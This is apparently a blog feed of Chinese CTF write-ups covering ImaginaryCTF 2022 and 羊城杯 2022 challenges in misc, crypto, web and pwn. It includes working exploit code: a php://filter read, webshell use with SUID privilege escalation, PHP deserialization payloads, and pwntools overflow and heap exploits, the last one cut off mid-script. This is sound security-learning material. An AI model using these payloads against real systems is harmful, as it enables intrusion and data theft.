<p><img src="http://img.hzy2003628.top/202207191314009.png" alt="image-20220719131412951"></p>
<p>接着再看/login这个路由，实现登录功能，从/home这个路由中获取auth的cookie值，然后if判断，时admin还是不是admin，是的话就会返回flag</p>
<p><img src="http://img.hzy2003628.top/202207191314859.png" alt="image-20220719131423776"></p>
<p>大致思路就是这样，所以现在首先需要获取admin当时生成的那个值（当时的那个随机数），这个时候看这个</p>
<pre><code class="hljs plaintext">users[cookie] = &#123;&quot;username&quot;: username, &quot;id&quot;: str(uuid.uuid1())&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207191319392.png" alt="image-20220719131924336"></p>
<p>所以只需要找到admin的id，就可以推出来时间，id看这里</p>
<p><img src="http://img.hzy2003628.top/202207191320805.png" alt="image-20220719132022757"></p>
<p>访问/users</p>
<p><img src="http://img.hzy2003628.top/202207191321025.png" alt="image-20220719132104952"></p>
<p><img src="http://img.hzy2003628.top/202207191321783.png" alt="image-20220719132112718"></p>
<p>即得到admin的id</p>
<pre><code class="hljs plaintext">2934212e-06a9-11ed-8455-6aa3d9e8413d</code></pre>
<p>然后使用UUID解码器https://createuuid.com/ko/decoder/</p>
<p><img src="http://img.hzy2003628.top/202207191323406.png" alt="image-20220719132330304"></p>
<p>得到时间是(这就是创建admin时的时间)</p>
<pre><code class="hljs plaintext">2022. 7. 18. 10:51:52 PM</code></pre>
<p>通过时间来得到那个随机值https://www.unixtimestamp.com/</p>
<p><img src="http://img.hzy2003628.top/202207191324409.png" alt="image-20220719132450301"></p>
<p>所以 1658155912就是那个生成admin时的随机值，但是到这还没有结束，因为他对随机值进行了小数点保留两位的限制，并不是整数，当然，我们可以一个一个试，但是太麻烦，写个脚本跑一下</p>
<pre><code class="hljs plaintext">import requests, time
import random
from hashlib import sha256

i = 1658155912.00  //  从整开始
for j in range(100000):
    random.seed(round(i, 2))
    password = &quot;&quot;.join([random.choice(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;) for _ in range(30)])
    cookie = sha256(password.encode()).hexdigest()

    URL = &quot;http://maas.chal.imaginaryctf.org/home&quot;
    header = &#123;&quot;cookie&quot; : f&quot;auth = &#123;cookie&#125;&quot;&#125;   // 创建一个cookie，登录
    res = requests.get(URL, headers=header)

    if &quot;ictf&quot; in res.text:   // 如果包含ictf，就会输出text文件，也就是flag
        print(res.text)
        break
    else:
        print(header)  // 不是的话就输出cookie头
        i += 0.01   // i一次加0.01，一直循环直到出flag</code></pre>
<p><img src="http://img.hzy2003628.top/202207191348231.png" alt="image-20220719134822145"></p>
<p>ictf{d0nt_use_uuid1_and_please_generate_passw0rds_securely_192bfa4d}</p>
<h1 id="pwn">pwn</h1>
<h2 id="ret2win">ret2win</h2>
<blockquote>
<p>Jumping around in memory is hard. I’ll give you some help so that you can pwn this!</p>
</blockquote>
<p>第一次做pwn题，接触一下吧</p>
<p>首先附件当然是拉到ida打开，反编译看一下</p>
<p><img src="http://img.hzy2003628.top/202207191407329.png" alt="image-20220719140744247"></p>
<p>附件中直接给了C语言的源代码，算是降低难度了</p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int win() &#123;
  FILE *fp;
  char flag[255];
  fp = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  fgets(flag, 255, fp);
  puts(flag);
&#125;

char **return_address;

int main() &#123;
  char buf[16];
  return_address = buf+24;

  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);

  puts(&quot;Welcome to ret2win!&quot;);
  puts(&quot;Right now I&#x27;m going to read in input.&quot;);
  puts(&quot;Can you overwrite the return address?&quot;);

  gets(buf);

  printf(&quot;Returning to %p...\n&quot;, *return_address);
&#125;</code></pre>
<p>暂且不先看伪代码，先看C语言的源代码，不难发现，在主函数中调用了get函数，最终我们的目的也肯定是执行win函数，然后才能输出flag，现在回到伪代码，可以看到那个gets函数。</p>
<p>查一下保护机制</p>
<p><img src="http://img.hzy2003628.top/202207191414484.png" alt="image-20220719141409412"></p>
<p>栈溢出问题，用 win()的加法器溢出返回地址,exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

context.binary = elf = ELF(&quot;./vuln&quot;)
#conn = elf.process()
conn = remote(&quot;ret2win.chal.imaginaryctf.org&quot;, 1337)

conn.sendline(b&quot;a&quot;*24 + p64(elf.sym.win))
conn.interactive()</code></pre>
<p><img src="http://img.hzy2003628.top/202207191415942.png" alt="image-20220719141541884"></p>
<p>ictf{c0ngrats_on_pwn_number_1_9b1e2f30}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年“羊城杯”网络安全大赛</title>
    <url>/2022/09/04/2022%E5%B9%B4%E2%80%9C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026964.png?x-oss-process=hzy" alt="img"></p>
<span id="more"></span>
<p><strong>2022年“羊城杯”网络安全大赛</strong></p>
<h1 id="前言">前言</h1>
<p>战队名称:AGCTF</p>
<p>战队排名：34</p>
<p>终究还是太菜，卷不动，静养回血ing</p>
<h1 id="misc">MISC</h1>
<h2 id="签个到">签个到</h2>
<p>ROT13+base32解密得到flag</p>
<p>flag{806a333fbb6aa7b7ac1a29552994cdfc}</p>
<h2 id="迷失幻境">迷失幻境</h2>
<p>用DAEMON Tools Lite进行挂载，附件得到一百张图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026532.png?x-oss-process=hzy" alt="img"></p>
<p>发现回收站还有个图片可莉可莉.jpg和一个少文件头的图片，修复一下</p>
<p>可莉可莉.jpg看到hint</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026534.png?x-oss-process=hzy" alt="img"></p>
<p>一百张几乎一样的图片，使用stegsolve找一张图片和回收站修复的图片对比一下，得到key</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026539.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026536.png?x-oss-process=hzy" alt="img"></p>
<p>Guess，outguess解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026538.png?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{f473a6fd2de17a0c5794414b3905ebbe}</p>
<h2 id="寻宝">寻宝</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026553.png?x-oss-process=hzy" alt="img"></p>
<p>所有十六进制数都反了，两两反转一下，得到压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026923.png?x-oss-process=hzy" alt="img"></p>
<p>解压得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026006.png?x-oss-process=hzy" alt="img"></p>
<p>是个游戏，背景音一直循环，能听到里面参杂钢琴音六个音调，听了几遍对照着找出来是ccfgcf-&gt;114514，应该是密码之一</p>
<p>然后游戏用ce修改一下地址，找到血量地址，改角色生命值</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026455.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026540.png?x-oss-process=hzy" alt="img"></p>
<p>修改锁定后成功修改<br>
<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026547.jpg?x-oss-process=hzy" alt="img"></p>
<p>游戏截图二十关，密码类型分两部分，前四张图是猪圈，后十六张是差分曼彻斯特编码，对应数字电路信号得到01011111 01100001 00110001 01011111</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026663.jpg?x-oss-process=hzy" alt="img"></p>
<p>二进制转str得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026681.png?x-oss-process=hzy" alt="img"></p>
<p>地图前几关是猪圈，但是太抽象了，一直没对照对，直接掩码爆破吧，测试了几回合，发现是这样的顺序???_a1_114514</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026712.png?x-oss-process=hzy" alt="img"></p>
<p>得到解压密码OWOH_a1_114514</p>
<p>得到flag.txt,是零宽度字符隐写<a href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a>用这个在线解密得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026226.png?x-oss-process=hzy" alt="img"></p>
<p>GWHT{Wher3_1S_Th4_1gI981O?}</p>
<h2 id="where_is_secret">where_is_secret</h2>
<p>vig.txt内维吉尼亚解密<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026232.png?x-oss-process=hzy" alt="img"><a href="https://www.guballa.de/vigenere-solver%E5%BE%97%E5%88%B0password:GWHT@R1nd0yyds">https://www.guballa.de/vigenere-solver得到password:GWHT@R1nd0yyds</a><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026238.png?x-oss-process=hzy" alt="img"></p>
<p>压缩包得bmp文件，比赛中间放的hint是文件加密过程，逆一下得到829962.txt</p>
<pre><code class="hljs plaintext">from PIL import Image

import numpy as np

def int2uni(n):

  return (&#x27;\\u&#123;:0&gt;4&#125;&#x27;.format(n)).encode().decode(&#x27;unicode_escape&#x27;)

with open(&quot;829962.txt&quot;, mode=&quot;wb&quot;) as flag:

  img = Image.open(&quot;out.bmp&quot;)

  data = np.array(img)

  w = h = data.shape[0]

  z = []

  for x in range(w):

​    for y in range(h):

​      data1 = data[x,y,:]

​      data2 = int2uni(str(hex(data1[1])).replace(&#x27;0x&#x27;,&#x27;&#x27;).rjust(2, &#x27;0&#x27;) + 

str(hex(data1[2])).replace(&#x27;0x&#x27;,&#x27;&#x27;).rjust(2, &#x27;0&#x27;))

​      z.append(data2)

  for data2 in z:

​    flag.write(data2.encode())

​    \#print(&#x27;ok&#x27;)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026366.png?x-oss-process=hzy" alt="img"></p>
<p>正则匹配删除文字,然后手动删除符号，得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026371.png?x-oss-process=hzy" alt="img"></p>
<p>竖着看，长句删除，得到flag</p>
<p>flag{h1d3_1n_th3_p1ctur3}</p>
<h2 id="躲猫猫">躲猫猫</h2>
<p>附件流量，wireshark分析一下，可以看到有上传功能</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026432.png?x-oss-process=hzy" alt="img"></p>
<p>找找流量，找到了上传的文件，是个图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026070.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026137.png?x-oss-process=hzy" alt="img"></p>
<p>又再ftp流量中找到压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026254.png?x-oss-process=hzy" alt="img"></p>
<p>导出来发现已经损坏，winrar修复一下之后发现需要密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026257.png?x-oss-process=hzy" alt="img"></p>
<p>可以看到key.log没有在加密范围之内，提取一下，后来发现还是显示数据报错，放到linux下解压就正常了，拉出来key.log进行分析，是解密TLS拿到一个图片，是password：20079651941337428</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026258.jpg?x-oss-process=hzy" alt="img">，是压缩包解压密码，解压得到hide&amp;<a href="http://seek.py">seek.py</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026265.png?x-oss-process=hzy" alt="img"></p>
<p>发现这个python是对目标图片进行重素</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026912.png?x-oss-process=hzy" alt="img">跑一脚本如下：</p>
<pre><code class="hljs plaintext">from PIL import Image

from numpy import array, zeros, uint8

import cv2

import os

image = cv2.imread(&quot;zz.png&quot;)

\# img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)

imagearray = array(image)

\# print(imagearray[0][0][1])

 

x,y = 5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328,6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688

 

l,w = 1800,1800

 

x1 = round(x/y*0.001, 16)

u1 = y*3650/x

x2 = round(x/y*0.00101, 16)

u2 = y*3675/x

x3 = round(x/y*0.00102, 16)

u3 = y*3680/x

kt = [x1, x2, x3]

 

temp_image = zeros(shape=[l, w, 3], dtype=uint8)

 

for k in range(0, 1):

  for i in range(0, l):

​    for j in range(0, w):

​      x1 = u1 * x1 * (1 - x1)

​      x2 = u2 * x2 * (1 - x2)

​      x3 = u3 * x3 * (1 - x3)

​      r1 = int(x1*255)

​      r2 = int(x2*255)

​      r3 = int(x3*255)

​      for t in range(0, 3):

​        temp_image[i][j][t] = (imagearray[i][j][t] - ((r1+r2) ^ r3)) % 256

  

  

  x1 = kt[0]

  x2 = kt[1]

  x3 = kt[2]

 

encflagarray = Image.fromarray(temp_image)

encflagarray.show()

encflagarray.save(&quot;cat.png&quot;)</code></pre>
<p>得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026056.png?x-oss-process=hzy" alt="img"></p>
<p>这是个新型二维码，采用中心定位，二维码补充中心定位(百度识图发现是这种圈圈定位，用ps扣了放上去的)</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026065.png?x-oss-process=hzy" alt="img"></p>
<p>然后在线识别https://demo.dynamsoft.com/barcode-reader/</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026127.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag：GWHT{ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3}</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="easyrsa">EasyRsa</h2>
<p>先求出c为38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</p>
<pre><code class="hljs plaintext">for i in a:

   n = int(i)

   c = pow(m, e, n)

   m = c

 print (&#x27;c = %s&#x27; % (m))</code></pre>
<p>脚本如下</p>
<pre><code class="hljs plaintext">from gmpy2 import *

from Crypto.Util.number import *

 

e = 65537

f = open(&quot;output.txt&quot;, &quot;r&quot;)

a = f.readlines()

\# print(a)

\# for i in a:

\#   n = int(i)

\#   c = pow(m, e, n)

\#   m = c

\# print (&#x27;c = %s&#x27; % (m))

f.close()

 

c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727

 

for i in range(11,0,-1):

  print(i)

p=gcd(int(a[i]),int(a[i-1]))

 

q=int(a[i])//p

  d=invert(e,(p-1)*(q-1))

  m=pow(c,d,int(a[i]))

  c=m

print(c)

p=gcd(int(a[1]),int(a[0]))

q=int(a[0])//p

d=invert(e,(p-1)*(q-1))

m=pow(c,d,int(a[0]))

 

print(m)

 

print(long_to_bytes(m))</code></pre>
<p>GWHT{gixkJl7SJTcpLOL9zqwo}</p>
<h2 id="lrsa">LRSA</h2>
<p>首先由数据P<em>P</em>Q和P<em>Q</em>Q的公约数，求出P,Q</p>
<pre><code class="hljs plaintext">from gmpy2 import *

data1=17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981

\# P*P*Q

data2=17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909

\# P*Q*Q

 

P=data1//gcd(data1,data2)

Q=data2//gcd(data1,data2)

print(&#x27;Q=&#x27;,Q)

print(&#x27;P=&#x27;,P)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026133.png?x-oss-process=hzy" alt="img"></p>
<p>解 <strong>t=(p*P-58*P+q)%Q</strong></p>
<p><strong>通过</strong>x = vector(ZZ, [1, P])，y = vector(ZZ, [0, Q])，m = matrix([x,y]) print(m.LLL())<br>
可求出p和q</p>
<pre><code class="hljs plaintext">p=80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205+58

q=71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407+44</code></pre>
<p>然后就rsa一把梭，脚本如下：</p>
<pre><code class="hljs plaintext">from gmpy2 import *

from Crypto.Util.number import *

p= 80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205+58

q=71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407+44

e=65537

c=4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746

d=invert(e,(p-1)*(q-1))

m=pow(c,d,p*q)

print(long_to_bytes(m))#b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026134.png?x-oss-process=hzy" alt="img"></p>
<p>DASCTF{8f3djoj9wedj2_dkc903cwckckdk}</p>
<h1 id="web">Web</h1>
<h2 id="rce_me">rce_me</h2>
<p>文件包含伪协议读取</p>
<p>php://filter/convert.base64-encode/resource=index.php</p>
<p>dirsearch扫目录</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026536.png?x-oss-process=hzy" alt="img"></p>
<p>伪协议读1.php，发现是个马<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026725.png?x-oss-process=hzy" alt="img"></p>
<p>直接上蚁剑</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026741.png?x-oss-process=hzy" alt="img"></p>
<p>发现得提权，直接date的suid读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026948.png?x-oss-process=hzy" alt="img"></p>
<p>flag{31240024220504177118549238509448}</p>
<h2 id="step_by_step-v3">step_by_step-v3</h2>
<p>构造反序列化，exp如下</p>
<pre><code class="hljs plaintext">&lt;?php

class yang

&#123;

  public $y1;

&#125;

class cheng

&#123;

  public $c1;

&#125;

class bei

&#123;

  public $b1;

&#125;

$a=new yang();

$b=new cheng();

$c=new bei();

$b-&gt;c1=$c;

$c-&gt;b1=$a;

$a-&gt;y1=&#x27;phpinfo&#x27;;

echo serialize($b);

 

// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:1:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026973.png?x-oss-process=hzy" alt="img"></p>
<p>​    flag{41398210650048416729033631022641}</p>
<h2 id="safepop">Safepop</h2>
<p>构造pop链，旨在到达getflag()</p>
<p>需要绕过_wakeup，exp如下</p>
<pre><code class="hljs plaintext">&lt;?php

 

class Fun&#123;

  private $func = &quot;Test::getFlag&quot;;

  public function __call($f,$p)&#123;

​    call_user_func($this-&gt;func,$f,$p);

  &#125;

 

&#125;

 

class Test&#123;

  public function getFlag()&#123;

​    system(&quot;cat /flag?&quot;);  // 终点

  &#125;

  public function __call($f,$p)&#123;

​    phpinfo();

  &#125;

 

&#125;

 

class A&#123;

  public $a;

  public function __get($p)&#123;  // 由B开始，通过析构函数触发

​    print(get_class($this-&gt;a));

​    if(preg_match(&quot;/Test/&quot;,get_class($this-&gt;a)))&#123;  //这地方限制了，所以要进行绕过

​      return &quot;No test in Prod\n&quot;;

​    &#125;

​    return $this-&gt;a-&gt;$p();

  &#125;

&#125;

 

class B&#123;  // 起点

  public $p;

  public function __destruct()&#123;

​    $p = $this-&gt;p;

​    echo $this-&gt;a-&gt;$p;

  &#125;

&#125;

 

$huang = new Fun();

$z = new A();

$z-&gt;a = $huang;

$payload = new B();

$payload-&gt;a = $z;

$payload-&gt;p = &#x27;&#x27;;

 

//echo base64_encode(serialize($payload));

echo serialize($payload);</code></pre>
<p>最后为了能够调用Test,\X00替换，以及改属性值绕过wakeup</p>
<pre><code class="hljs plaintext">O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:0:&quot;&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:99:&#123;s:9:&quot;%00Fun%00func&quot;;s:13:&quot;Test::getFlag&quot;;&#125;&#125;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026978.png?x-oss-process=hzy" alt="img"></p>
<p>flag{66639492335825537486481402904936}</p>
<h1 id="pwn">PWN</h1>
<h2 id="dream">Dream</h2>
<p>先check一下看保护</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026069.png?x-oss-process=hzy" alt="img"></p>
<p>64位程序，看下主体逻辑，发现是个类似于菜单选项的程序</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026454.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026558.png?x-oss-process=hzy" alt="img"></p>
<p>分析一下可以看到free之后没有清除指针，可以利用UAF</p>
<p>需要注意的是返回值restult有一段加密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026568.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209042026622.png?x-oss-process=hzy" alt="img"></p>
<p>需要解密之后才能泄露地址。大致思路就出来了：直接利用一次常规的largebin attack来攻击stderr，然后再利用UAF来修改topchunk，从而触发malloc_asssert，最后直接拿来house of cat用就行了</p>
<p>Exp如下：</p>
<pre><code class="hljs plaintext">from pwn import *

address=remote(&quot;tcp.dasc.buuoj.cn&quot;,28079)

\#address=process(&quot;./dream&quot;)

elf=ELF(&quot;./dream&quot;)

libc=ELF(&quot;./libc-2.32.so&quot;)

 

context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)

context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]

 

def add(index,size,content):

  address.sendlineafter(&quot;choice: &quot;,&#x27;1&#x27;)

  address.sendlineafter(&quot;Give me a dream ID: &quot;,str(index))

  address.sendlineafter(&quot;how long: &quot;,str(size))

  address.sendafter(&quot;dream: &quot;,content)

 

def delete(index):

  address.sendlineafter(&quot;choice: &quot;,&#x27;2&#x27;)

  address.sendlineafter(&quot;Which dream to wake?&quot;,str(index))

 

  

def show(index):

  address.sendlineafter(&quot;choice: &quot;,&#x27;4&#x27;)

  address.sendlineafter(&quot;Which dream do you want to show?&quot;,str(index))

 

def edit(index,content):

  address.sendlineafter(&quot;choice: &quot;,&#x27;3&#x27;)

  address.sendlineafter(&quot;Which dream to make?&quot;,str(index))

  address.sendafter(&quot;dream: &quot;,content)

 

def decode(chars,len,sercet):

  v9 = 52 // len + 6

  delta = 0

  delta -= v9 * 0x61C88647

  delta &amp;= 0xffffffff

  bk = chars[0]

 

  while(v9):

 

   for i in range(1,len)[::-1]:

​     fd = chars[i - 1]

​     chars[i] -= (((8 * bk) ^ (fd &gt;&gt; 7)) + ((bk &gt;&gt; 3) ^ (16 * fd))) ^ ((bk ^ delta) + (fd ^ sercet[((delta &gt;&gt; 2) &amp; 3) ^ i &amp; 3]))

​     chars[i] &amp;= 0xffffffff

​     bk = chars[i]

   i -= 1

   fd = chars[len - 1]

   chars[0] -= (((8 * bk) ^ (fd &gt;&gt; 7)) + ((bk &gt;&gt; 3) ^ (16 * fd))) ^ ((bk ^ delta) + (fd ^ sercet[((delta &gt;&gt; 2) &amp; 3) ^ i &amp; 3]))

   chars[0] &amp;= 0xffffffff

   bk = chars[0]

 

   delta += 0x61C88647

   delta &amp;= 0xffffffff

 

   v9-=1

  return chars

 

sercet = [9,5,2,7]

 

add(0,0x420,&#x27;a&#x27;)

add(1,0x400,&#x27;b&#x27;)

add(2,0x410,&quot;c&quot;)

delete(0)

delete(1)

show(0)

chars1=[]

 

for a in range(0x420//4):

  chars1.append(int.from_bytes(address.recv(4), &quot;little&quot;))

 

chars1=decode(chars1,0x420//4,sercet)

main_arena=(chars1[0]+(chars1[1]&lt;&lt;32)) - 96

libc_base=main_arena - 0x10 - libc.symbols[&#x27;__malloc_hook&#x27;]

success(&quot;libc_base = &quot;+hex(libc_base))

 

stderr_addr=libc_base+libc.symbols[&#x27;stderr&#x27;]

set_context=libc_base+libc.symbols[&#x27;setcontext&#x27;]+61

 

show(1)

 

chars2=[]

 

for a in range(0x400//4):

  chars2.append(int.from_bytes(address.recv(4), &quot;little&quot;))

 

chars2=decode(chars2,0x400//4,sercet)

 

heap_base=(chars2[2]+(chars2[3]&lt;&lt;32)) - 0x10

success(&quot;heap_base = &quot;+hex(heap_base))

 

payload=p64(main_arena+96)*2

payload=payload.ljust(0x410,b&#x27;\x00&#x27;)

edit(0,payload)

 

payload=p64(heap_base&gt;&gt;12)+p64(heap_base+0x10)

payload=payload.ljust(0x400,b&#x27;\x00&#x27;)

edit(1,payload)

 

add(3,0x440,&quot;d&quot;)

delete(2)

 

payload=p64(0)*3+p64(stderr_addr - 0x20)

edit(0,payload)

 

add(4,0x4f0,&#x27;e&#x27;)

 

delete(4)

add(5,0x430,&#x27;z&#x27;)

 

payload=b&#x27;\x00&#x27;*0x438+p64(0x70)

edit(4,payload)

 

fake_addr=heap_base+0xad0 # 伪造的fake的地址

next_chain = 0

fake_FILE=p64(heap_base)     

fake_FILE+=p64(0)*7

fake_FILE +=p64(heap_base+0xee0)+p64(0)

